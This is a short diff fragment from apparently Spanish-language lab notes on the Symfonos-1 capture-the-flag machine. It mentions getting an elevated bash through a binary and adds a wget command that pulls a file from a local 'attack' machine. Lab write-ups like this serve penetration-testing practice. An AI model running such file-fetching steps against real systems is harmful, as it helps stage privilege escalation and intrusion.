@@ -529,6 +529,10 @@ explotando este binario logramos conseguir una bash con privilegios elevados
 	wget http://10.2.2.6:1331/archivo
 ---------------------------------------------------------------------------------------------------------------------------------------
 
+	*Maquina Attack*
+	wget http://10.0.2.5:1441/archivo
+
+	*Maquina Symfonos-1*
 	
 ```
 
